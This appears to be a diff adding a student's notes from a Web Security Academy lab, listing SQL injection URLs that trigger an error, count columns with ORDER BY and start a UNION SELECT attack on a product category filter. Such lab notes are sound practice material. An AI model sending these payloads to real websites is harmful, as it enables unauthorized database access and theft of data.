@@ -1,0 +1,12 @@
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts'
+// Triggers error
+
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts%27+--+
+// Normal response
+
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+1--+
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+2--+
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+3--+
+// 3 columns in original select
+
+https://acf11f051e988394807dd249000100b2.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,NULL,NULL--+
